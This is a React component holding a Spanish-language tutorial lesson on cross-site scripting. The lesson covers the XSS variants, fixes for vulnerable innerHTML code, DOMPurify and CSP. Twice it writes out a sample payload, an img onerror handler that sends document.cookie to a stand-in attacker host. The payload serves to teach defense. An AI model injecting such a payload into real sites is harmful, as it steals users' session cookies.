import {
  LessonLayout,
  LessonSection,
  CodeBlock,
  InfoBox,
  LessonKeyPoints,
  LessonExercises,
  LessonSummary
} from '../../../components';
import { LessonNavigation } from '../../../components/LessonNavigation';
import { useBreadcrumb } from '../../../hooks/useBreadcrumb';
import { useLessonNavigation } from '../../../hooks/useLessonNavigation';

export function LessonCiberseguridadXSS() {
  const breadcrumbs = useBreadcrumb();
  const nav = useLessonNavigation();

  const title = 'XSS (Cross-Site Scripting)';

  const keyPoints = [
    'XSS consiste en conseguir que código JavaScript escrito por un atacante se ejecute en el navegador de otro usuario, dentro del contexto de una web legítima',
    'Existen tres variantes principales: reflejado (el payload viaja en la propia petición), almacenado (el payload queda guardado en el servidor) y DOM-based (el fallo está solo en JavaScript del cliente)',
    'La causa habitual es insertar input del usuario en el DOM con innerHTML (u otras vías equivalentes) sin sanitizarlo ni escaparlo',
    'textContent es seguro por diseño para mostrar texto plano: el navegador nunca interpreta su contenido como HTML',
    'Cuando sí necesitas renderizar HTML controlado por el usuario (un editor de texto enriquecido, por ejemplo), se usa una librería de sanitización como DOMPurify, nunca innerHTML a pelo',
    'Content-Security-Policy (CSP) es una capa de defensa adicional a nivel de cabecera HTTP, no un sustituto de sanitizar correctamente el input'
  ];

  const exercises = [
    {
      title: 'Identifica y corrige el fallo',
      description:
        'La siguiente función muestra el nombre de usuario, obtenido de la respuesta de una API, dentro de un saludo en la página. Localiza el problema de seguridad y corrígelo.',
      solution: `// Versión vulnerable de partida:
function mostrarSaludo(nombreUsuario) {
  const contenedor = document.getElementById('saludo');
  contenedor.innerHTML = '<h2>Hola, ' + nombreUsuario + '</h2>';
}
// Si nombreUsuario contiene algo como
// <img src=x onerror="fetch('https://atacante.com?c='+document.cookie)">
// ese código se ejecuta en el navegador de quien vea la página.

// Versión segura:
function mostrarSaludo(nombreUsuario) {
  const contenedor = document.getElementById('saludo');
  const titulo = document.createElement('h2');
  titulo.textContent = 'Hola, ' + nombreUsuario;
  contenedor.replaceChildren(titulo);
}
// textContent nunca interpreta el valor como HTML, así que el
// contenido malicioso se muestra como texto literal, inofensivo.`
    },
    {
      title: 'Clasifica el tipo de XSS',
      description:
        'Para cada escenario, indica si se trata de XSS reflejado, almacenado o DOM-based: (a) un buscador muestra "No hay resultados para: <valor de la URL>" sin escapar el valor; (b) un comentario malicioso guardado en la base de datos se muestra a todos los usuarios que visitan esa publicación; (c) un script del cliente lee un fragmento de la URL (location.hash) y lo inserta en el DOM sin pasar nunca por el servidor.',
      solution: `(a) XSS reflejado: el payload viaja en la propia petición (la URL de
búsqueda) y el servidor lo "refleja" de vuelta en la respuesta sin
escaparlo.

(b) XSS almacenado: el payload queda guardado de forma persistente
(en la base de datos, como comentario) y se sirve a cualquier
usuario que visite esa página, sin que tenga que hacer clic en
ningún enlace especial.

(c) XSS DOM-based: el fallo está completamente en el JavaScript del
navegador. El dato nunca pasa por el servidor: se lee y se inserta
en el DOM en el propio cliente.`
    }
  ];

  const summary = `XSS (Cross-Site Scripting) permite a un atacante ejecutar JavaScript propio en el navegador de otros usuarios, aprovechando una web legítima como vector:

• Reflejado, almacenado y DOM-based son las tres variantes principales, según de dónde venga y por dónde pase el payload malicioso
• La causa típica es insertar input del usuario en el DOM con innerHTML sin sanitizar
• textContent es la opción segura por defecto cuando solo necesitas mostrar texto
• Si necesitas permitir HTML con formato, se sanitiza con una librería especializada (como DOMPurify) antes de insertarlo
• Content-Security-Policy añade una capa extra de defensa a nivel de cabecera HTTP, restringiendo qué scripts puede ejecutar el navegador, pero no sustituye a sanitizar correctamente el input`;

  return (
    <>
      <LessonLayout
        title={title}
        description="Qué es el Cross-Site Scripting (XSS), sus variantes y cómo protegerte de este ataque"
        breadcrumbs={breadcrumbs}
        seoTitle="XSS (Cross-Site Scripting) | Ciberseguridad - Fullstack Dev Lovers"
        seoDescription="Descubre qué es el ataque XSS (Cross-Site Scripting), sus tipos (reflejado, almacenado, DOM) y cómo prevenirlo en tus aplicaciones web."
        seoKeywords="xss, cross site scripting, ataque xss, prevenir xss"
        url="https://fullstackdevlovers.com/ciberseguridad/owasp/xss-cross-site-scripting"
      >
        <p>
          En la lección anterior viste cómo un input malicioso puede colarse en una consulta SQL. El{' '}
          <strong>XSS (Cross-Site Scripting)</strong> parte de la misma idea de fondo, pero cambia el
          escenario: en lugar de código que se ejecuta en tu base de datos, es{' '}
          <strong>JavaScript que se ejecuta en el navegador de otro usuario</strong>, como si formara parte
          legítima de tu web.
        </p>

        <LessonSection title="¿Qué es XSS?">
          <p>
            <strong>Cross-Site Scripting</strong> es una vulnerabilidad que permite a un atacante inyectar
            código (casi siempre JavaScript) en una página web, de forma que ese código se ejecuta en el
            navegador de otros usuarios cuando visitan esa página. El navegador no tiene forma de distinguir
            "esto es un script legítimo de la web" de "esto es un script que coló un atacante": simplemente
            lo ejecuta con los mismos permisos que el resto del sitio.
          </p>
          <p>
            Esto es especialmente grave porque ese script inyectado puede acceder a cosas como las cookies de
            sesión del usuario, el contenido del DOM, o hacer peticiones a la propia API en nombre del
            usuario que tiene la sesión abierta.
          </p>
        </LessonSection>

        <LessonSection title="Tipos de XSS">
          <p>Se suelen distinguir tres variantes, según de dónde viene el payload malicioso y por dónde pasa:</p>
          <ul>
            <li>
              <strong>XSS reflejado:</strong> el código malicioso viaja como parte de la propia petición (por
              ejemplo, en un parámetro de la URL) y el servidor lo devuelve ("lo refleja") tal cual dentro de
              la respuesta HTML, sin escaparlo. Suele requerir que la víctima haga clic en un enlace
              manipulado.
            </li>
            <li>
              <strong>XSS almacenado (stored):</strong> el payload queda guardado de forma persistente en el
              servidor (en la base de datos, por ejemplo un comentario o un campo de perfil) y se sirve a
              cualquier usuario que visite esa página, sin necesidad de un enlace especial. Suele
              considerarse el más peligroso, porque afecta a todos los visitantes.
            </li>
            <li>
              <strong>XSS basado en DOM (DOM-based):</strong> el fallo está completamente en el código
              JavaScript que se ejecuta en el navegador: lee un dato (por ejemplo, de{' '}
              <code>location.hash</code> o de <code>document.URL</code>) y lo inserta en el DOM sin pasar
              nunca por el servidor.
            </li>
          </ul>
        </LessonSection>

        <LessonSection title="Código vulnerable: innerHTML con input sin sanitizar">
          <p>
            Imagina una sección de comentarios donde cada comentario se pinta con el texto que escribió el
            usuario:
          </p>
          <CodeBlock
            language="javascript"
            title="comentarios.js (VULNERABLE)"
            code={`function mostrarComentario(comentario) {
  const contenedor = document.getElementById('comentarios');

  // VULNERABLE: comentario.texto se inserta directamente como HTML
  contenedor.innerHTML += \`<p>\${comentario.autor}: \${comentario.texto}</p>\`;
}`}
          />
          <p>
            Si <code>comentario.texto</code> contiene, en lugar de un comentario normal, algo como:
          </p>
          <CodeBlock
            language="xml"
            code={`<img src="x" onerror="fetch('https://atacante.com/robo?cookie=' + document.cookie)">`}
          />
          <p>
            el navegador intentará cargar una imagen inexistente ("x"), fallará, y ejecutará el código del
            atributo <code>onerror</code>: en este caso, enviando la cookie de sesión del usuario a un
            servidor controlado por el atacante. Ese comentario, además, quedaría guardado en la base de
            datos y se ejecutaría en el navegador de <strong>cada</strong> usuario que visite esa página
            (XSS almacenado).
          </p>
        </LessonSection>

        <LessonSection title="Código seguro: textContent y escapado">
          <p>
            Cuando solo necesitas mostrar texto (que es el caso más habitual: nombres, comentarios, mensajes
            de usuario), la solución es usar <code>textContent</code> en lugar de <code>innerHTML</code>. El
            navegador nunca interpreta el valor de <code>textContent</code> como HTML, así que cualquier
            etiqueta o script que contenga se muestra literalmente como texto, sin ejecutarse:
          </p>
          <CodeBlock
            language="javascript"
            title="comentarios.js (seguro)"
            code={`function mostrarComentario(comentario) {
  const contenedor = document.getElementById('comentarios');

  const parrafo = document.createElement('p');
  const autor = document.createElement('strong');
  autor.textContent = comentario.autor + ': ';

  const texto = document.createTextNode(comentario.texto);

  parrafo.append(autor, texto);
  contenedor.appendChild(parrafo);
}
// Si comentario.texto contiene "<img src=x onerror=...>", se muestra
// tal cual como texto: "<img src=x onerror=...>", sin ejecutarse.`}
          />
          <p>
            Muchos frameworks frontend modernos (React entre ellos) escapan automáticamente el contenido que
            insertas en JSX, por lo que en esos entornos rara vez usarás <code>innerHTML</code> a mano. El
            riesgo aparece precisamente cuando, de forma explícita, se salta esa protección (en React, por
            ejemplo, con <code>dangerouslySetInnerHTML</code>){' '}
            {/* TODO-verificar: comportamiento exacto de escapado según el framework/versión concretos */}.
          </p>
        </LessonSection>

        <LessonSection title="Cuando sí necesitas HTML: sanitización con una librería">
          <p>
            A veces sí necesitas permitir HTML real, por ejemplo, en un editor de texto enriquecido donde el
            usuario puede poner negrita, enlaces o listas. En ese caso, <code>textContent</code> no sirve
            (mostraría las etiquetas como texto en vez de aplicarlas). La solución es{' '}
            <strong>sanitizar</strong> ese HTML con una librería especializada antes de insertarlo, que
            elimina o neutraliza cualquier parte peligrosa (scripts, manejadores de eventos como{' '}
            <code>onerror</code>, etc.) y deja solo el HTML "seguro":
          </p>
          <CodeBlock
            language="bash"
            code="npm install dompurify"
          />
          <CodeBlock
            language="javascript"
            code={`import DOMPurify from 'dompurify';

function mostrarComentarioConFormato(comentario) {
  const contenedor = document.getElementById('comentarios');

  // DOMPurify elimina scripts, manejadores de eventos y otras vías
  // de ejecutar código, dejando solo etiquetas de formato seguras
  const htmlLimpio = DOMPurify.sanitize(comentario.textoConFormato);

  contenedor.innerHTML += \`<p>\${htmlLimpio}</p>\`;
}`}
          />
          <InfoBox type="warning" title="Nunca confíes en un sanitizador casero">
            Escribir tu propia función para "quitar etiquetas peligrosas" con expresiones regulares es un
            error habitual: hay demasiados casos límite (mayúsculas, atributos poco comunes, HTML mal
            formado que el navegador corrige de formas inesperadas...) para hacerlo de forma fiable a mano.
            Usa siempre una librería mantenida y probada para esto.
          </InfoBox>
        </LessonSection>

        <LessonSection title="Una capa extra: Content-Security-Policy (CSP)">
          <p>
            <strong>Content-Security-Policy</strong> es una cabecera HTTP que le dice al navegador qué
            orígenes de scripts, estilos, imágenes, etc. tiene permitido cargar y ejecutar en tu página. No
            evita que exista una vulnerabilidad XSS en tu código, pero puede evitar que sea explotable en la
            práctica: si un script inyectado intenta ejecutarse o conectar con un dominio no permitido por la
            política, el navegador lo bloquea.
          </p>
          <CodeBlock
            language="javascript"
            title="app.js (Express + helmet)"
            code={`const helmet = require('helmet');

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"], // solo scripts servidos desde tu propio dominio
      objectSrc: ["'none'"]
    }
  })
);`}
          />
          <InfoBox type="info" title="CSP es defensa en profundidad, no la solución">
            Piensa en CSP como una red de seguridad adicional, no como el arreglo del problema. La primera
            línea de defensa siempre es no insertar HTML sin sanitizar en el DOM; CSP reduce el daño si, aun
            así, algo se cuela.
          </InfoBox>
        </LessonSection>

        <LessonKeyPoints points={keyPoints} />
        <LessonExercises exercises={exercises} />
        <LessonSummary summary={summary} />

        {/* AVISO: no se encontró un criterio específico en docs/criterios/ciberseguridad.md (ni la carpeta docs/criterios/) en el
            repositorio en el momento de redactar esta lección. Se han aplicado las reglas base del redactor de contenidos (tono
            cercano y riguroso, progresión simple->compleja, estructura introducción/conceptos/ejemplos/resumen y marcado de
            afirmaciones no garantizadas con TODO-verificar). */}
      </LessonLayout>
      <LessonNavigation
        previousLink={nav.previous}
        previousTitle={nav.previousTitle}
        nextLink={nav.next}
        nextTitle={nav.nextTitle}
      />
    </>
  );
}
